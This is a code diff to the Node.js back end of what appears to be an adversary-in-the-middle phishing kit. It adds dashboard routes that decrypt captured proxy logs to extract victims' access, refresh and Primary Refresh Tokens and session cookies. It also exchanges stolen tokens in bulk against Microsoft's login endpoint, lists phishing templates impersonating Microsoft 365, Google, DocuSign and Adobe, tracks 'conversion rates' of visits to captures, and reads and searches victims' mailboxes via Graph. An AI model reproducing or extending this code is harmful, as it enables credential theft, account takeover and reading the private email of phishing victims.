@@ -675,7 +675,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     // ── Dashboard API endpoints ──
-    if (url.startsWith('/api/')) {
+    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
         await handleDashboardAPI(req, res);
         return;
     }
@@ -698,13 +698,15 @@ const server = http.createServer(async (req, res) => {
 });
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER
+// 🔧 DASHBOARD API HANDLER (FIXED — handles both /api/ and /dash/api/)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
+    // ── ✅ FIX: Strip /dash prefix if present ──
+    const apiPath = url.replace(/^\/dash/, '');
 
     // ── Status ──
-    if (url === '/api/status') {
+    if (apiPath === '/api/status') {
         try {
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -717,7 +719,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Logs ──
-    if (url === '/api/logs') {
+    if (apiPath === '/api/logs') {
         try {
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
             const logs = files.map(f => {
@@ -734,8 +736,8 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Log detail ──
-    if (url.startsWith('/api/log/')) {
-        const filename = url.replace('/api/log/', '');
+    if (apiPath.startsWith('/api/log/')) {
+        const filename = apiPath.replace('/api/log/', '');
         const filePath = path.join(LOGS_DIRECTORY, filename);
         if (!fs.existsSync(filePath)) {
             res.writeHead(404);
@@ -768,7 +770,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Export ZIP ──
-    if (url === '/api/export/all' && AdmZip) {
+    if (apiPath === '/api/export/all' && AdmZip) {
         try {
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
             if (files.length === 0) {
@@ -795,7 +797,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Visits ──
-    if (url === '/api/visits') {
+    if (apiPath === '/api/visits') {
         try {
             if (!fs.existsSync(VISITS_LOG_FILE)) {
                 res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -820,7 +822,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Vault Scan ──
-    if (url === '/api/vault/scan' && req.method === 'POST') {
+    if (apiPath === '/api/vault/scan' && req.method === 'POST') {
         try {
             const tokens = vault.scanLogs();
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -833,7 +835,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Vault Tokens ──
-    if (url === '/api/vault/tokens') {
+    if (apiPath === '/api/vault/tokens') {
         try {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: true, tokens: vault.tokens || [] }));
@@ -845,7 +847,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Vault Stats ──
-    if (url === '/api/vault/stats') {
+    if (apiPath === '/api/vault/stats') {
         try {
             const stats = vault.getStats();
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -858,7 +860,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Vault Health Check ──
-    if (url === '/api/vault/healthcheck' && req.method === 'POST') {
+    if (apiPath === '/api/vault/healthcheck' && req.method === 'POST') {
         try {
             const results = await vault.healthCheckAll();
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -871,7 +873,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Vault Exchange ──
-    if (url === '/api/vault/exchange' && req.method === 'POST') {
+    if (apiPath === '/api/vault/exchange' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
@@ -905,7 +907,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Device Request ──
-    if (url === '/api/device/request' && req.method === 'POST') {
+    if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
             res.end(JSON.stringify({ error: 'axios not installed' }));
@@ -941,7 +943,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Device Token ──
-    if (url === '/api/device/token' && req.method === 'POST') {
+    if (apiPath === '/api/device/token' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
@@ -990,7 +992,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Device History ──
-    if (url === '/api/device/history') {
+    if (apiPath === '/api/device/history') {
         try {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: true, flows: deviceFlows }));
@@ -1002,7 +1004,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Device Manual ──
-    if (url === '/api/device/manual' && req.method === 'POST') {
+    if (apiPath === '/api/device/manual' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
@@ -1044,7 +1046,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── Device Use ──
-    if (url === '/api/device/use' && req.method === 'POST') {
+    if (apiPath === '/api/device/use' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
@@ -1083,7 +1085,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── PRT Scan ──
-    if (url === '/api/prt/scan' && req.method === 'POST') {
+    if (apiPath === '/api/prt/scan' && req.method === 'POST') {
         try {
             const prts = [];
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -1130,7 +1132,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── PRT List ──
-    if (url === '/api/prt/list') {
+    if (apiPath === '/api/prt/list') {
         try {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: true, prts: prtStorage.prts || [] }));
@@ -1142,7 +1144,7 @@ async function handleDashboardAPI(req, res) {
     }
 
     // ── PRT Exchange ──
-    if (url === '/api/prt/exchange' && req.method === 'POST') {
+    if (apiPath === '/api/prt/exchange' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
@@ -1178,8 +1180,342 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // ── PRT Health ──
+    if (apiPath === '/api/prt/health' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { prt } = JSON.parse(body);
+                if (!prt) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'PRT required' }));
+                    return;
+                }
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                    );
+                }, 2, 1000, 2);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, valid: true, data: response.data }));
+            } catch (err) {
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, valid: false, error: err.response?.data?.error_description || err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── PRT Health All ──
+    if (apiPath === '/api/prt/health-all' && req.method === 'POST') {
+        try {
+            const results = [];
+            for (const item of prtStorage.prts || []) {
+                try {
+                    const response = await retry(async () => {
+                        return await axios.post(
+                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                            new URLSearchParams({
+                                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                                assertion: item.prt,
+                                requested_token_use: 'on_behalf_of',
+                                scope: 'https://graph.microsoft.com/.default offline_access'
+                            }),
+                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                        );
+                    }, 2, 1000, 2);
+                    results.push({ username: item.username, valid: true, data: response.data });
+                } catch (e) {
+                    results.push({ username: item.username, valid: false, error: e.message });
+                }
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── PRT Exchange All ──
+    if (apiPath === '/api/prt/exchange-all' && req.method === 'POST') {
+        try {
+            const results = [];
+            for (const item of prtStorage.prts || []) {
+                try {
+                    const response = await retry(async () => {
+                        return await axios.post(
+                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                            new URLSearchParams({
+                                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                                assertion: item.prt,
+                                requested_token_use: 'on_behalf_of',
+                                scope: 'https://graph.microsoft.com/.default offline_access'
+                            }),
+                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                        );
+                    }, 2, 1000, 2);
+                    results.push({
+                        username: item.username,
+                        success: true,
+                        access_token: response.data.access_token?.slice(0, 40) + '...',
+                        refresh_token: response.data.refresh_token?.slice(0, 40) + '...'
+                    });
+                } catch (e) {
+                    results.push({ username: item.username, success: false, error: e.message });
+                }
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── PRT Stats ──
+    if (apiPath === '/api/prt/stats') {
+        try {
+            const total = prtStorage.prts?.length || 0;
+            const uniqueUsers = new Set((prtStorage.prts || []).map(p => p.username)).size;
+            const healthy = (prtStorage.prts || []).filter(p => p.last_refresh).length;
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                stats: { total, uniqueUsers, healthy, lastScan: prtStorage.lastScan }
+            }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Tokens from log ──
+    if (apiPath.startsWith('/api/tokens/')) {
+        const filename = apiPath.replace('/api/tokens/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404);
+            res.end(JSON.stringify({ error: 'Log not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            const tokens = {
+                access_tokens: [],
+                refresh_tokens: [],
+                id_tokens: [],
+                prt_tokens: [],
+                cookies: [],
+                sessions: [],
+                username: 'Unknown'
+            };
+            let username = 'Unknown';
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    const obj = JSON.parse(decrypted.toString('utf-8'));
+                    const body = obj.proxyRequestBody;
+                    if (body) {
+                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                        if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
+                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                        if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
+                        const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                        if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
+                        const prtMatch = bodyStr.match(/prt=([^&]+)/i);
+                        if (prtMatch) tokens.prt_tokens.push(decodeURIComponent(prtMatch[1]));
+                        try {
+                            const parsed = typeof body === 'string' ? JSON.parse(body) : body;
+                            if (parsed.username || parsed.login || parsed.user || parsed.Email) {
+                                username = parsed.username || parsed.login || parsed.user || parsed.Email;
+                            }
+                        } catch (e) {}
+                    }
+                    if (obj.proxyResponseHeaders && obj.proxyResponseHeaders['set-cookie']) {
+                        const cookieHeaders = obj.proxyResponseHeaders['set-cookie'];
+                        const arr = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
+                        arr.forEach(c => {
+                            const [nameVal] = c.split(';');
+                            if (nameVal) tokens.cookies.push(nameVal);
+                        });
+                    }
+                } catch (e) {}
+            }
+            tokens.username = username;
+            if (tokens.access_tokens.length > 0) {
+                try {
+                    const parts = tokens.access_tokens[0].split('.');
+                    if (parts.length === 3) {
+                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                        tokens.username = payload.email || payload.preferred_username || payload.upn || tokens.username;
+                    }
+                } catch (e) {}
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, tokens }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Analytics ──
+    if (apiPath === '/api/analytics') {
+        try {
+            let visits = [];
+            let captures = [];
+            if (fs.existsSync(VISITS_LOG_FILE)) {
+                const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+                const lines = content.split('\n').filter(line => line.trim());
+                visits = lines.map(line => JSON.parse(line));
+            }
+            const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            captures = logFiles.map(f => {
+                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                return { file: f, modified: stat.mtime, size: stat.size };
+            });
+            const now = new Date();
+            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+            const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+            const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
+            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+            const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+            const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
+            const todayCaptures = captures.filter(c => c.modified >= today);
+            const weekCaptures = captures.filter(c => c.modified >= weekAgo);
+            const monthCaptures = captures.filter(c => c.modified >= monthAgo);
+            const conversionRate = {
+                today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
+                week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
+                month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
+                total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
+            };
+            const dailyCaptures = {};
+            const dailyVisits = {};
+            for (let i = 6; i >= 0; i--) {
+                const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
+                const key = d.toDateString();
+                dailyCaptures[key] = 0;
+                dailyVisits[key] = 0;
+            }
+            captures.forEach(c => {
+                const key = new Date(c.modified).toDateString();
+                if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
+            });
+            visits.forEach(v => {
+                const key = new Date(v.timestamp).toDateString();
+                if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
+            });
+            const domains = {};
+            visits.forEach(v => {
+                const url = v.url || '';
+                const match = url.match(/https?:\/\/([^\/]+)/);
+                if (match) {
+                    const domain = match[1];
+                    domains[domain] = (domains[domain] || 0) + 1;
+                }
+            });
+            const topDomains = Object.entries(domains)
+                .sort((a, b) => b[1] - a[1])
+                .slice(0, 5)
+                .map(([domain, count]) => ({ domain, count }));
+            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                analytics: {
+                    visits: {
+                        total: visits.length,
+                        today: todayVisits.length,
+                        week: weekVisits.length,
+                        month: monthVisits.length
+                    },
+                    captures: {
+                        total: captures.length,
+                        today: todayCaptures.length,
+                        week: weekCaptures.length,
+                        month: monthCaptures.length
+                    },
+                    conversionRate,
+                    uniqueIPs,
+                    dailyCaptures,
+                    dailyVisits,
+                    topDomains,
+                    captureTimeline: captures.map(c => ({
+                        date: c.modified,
+                        file: c.file,
+                        size: c.size
+                    }))
+                }
+            }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Phishlets ──
+    if (apiPath === '/api/phishlets') {
+        try {
+            const phishlets = {
+                microsoft: { name: 'Microsoft 365', file: 'microsoft.html', entryPoint: '/login', enabled: true },
+                google: { name: 'Google', file: 'google.html', entryPoint: '/accounts', enabled: true },
+                docusign: { name: 'DocuSign', file: 'docusign.html', entryPoint: '/signin', enabled: false },
+                adobe: { name: 'Adobe', file: 'adobe.html', entryPoint: '/login', enabled: false }
+            };
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, phishlets }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Phishlets Toggle ──
+    if (apiPath === '/api/phishlets/toggle' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { id, enabled } = JSON.parse(body);
+                // For demo, just return success
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, message: `${id} ${enabled ? 'enabled' : 'disabled'}` }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
     // ── Graph Recon ──
-    if (url === '/api/recon' && req.method === 'POST') {
+    if (apiPath === '/api/recon' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
@@ -1202,6 +1538,123 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // ── Webmail Folders ──
+    if (apiPath === '/api/webmail/folders' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const folders = await graph.get('/me/mailFolders');
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, folders: folders.value || [] }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail Emails ──
+    if (apiPath === '/api/webmail/emails' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                let endpoint;
+                if (folderId === 'inbox') {
+                    endpoint = `/me/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+                } else if (folderId === 'sent') {
+                    endpoint = `/me/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+                } else {
+                    endpoint = `/me/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+                }
+                const emails = await graph.get(endpoint);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, emails: emails.value || [], count: emails.value?.length || 0 }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail Single Email ──
+    if (apiPath === '/api/webmail/email' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, messageId } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                if (!messageId) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Message ID required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, email }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail Search ──
+    if (apiPath === '/api/webmail/search' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, query, folderId = 'inbox', limit = 50 } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                if (!query) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Search query required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const searchUrl = folderId === 'inbox'
+                    ? `/me/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
+                    : `/me/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
+                const results = await graph.get(searchUrl);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, emails: results.value || [] }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
     // ── 404 ──
     res.writeHead(404, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ error: 'API endpoint not found' }));
@@ -1212,7 +1665,6 @@ async function handleDashboardAPI(req, res) {
 // ============================================================
 function proxyHandler(req, res) {
     // Re-emit the request to the proxy server
-    // The proxy server is defined below with all the working logic
     proxyServer.emit('request', req, res);
 }
 
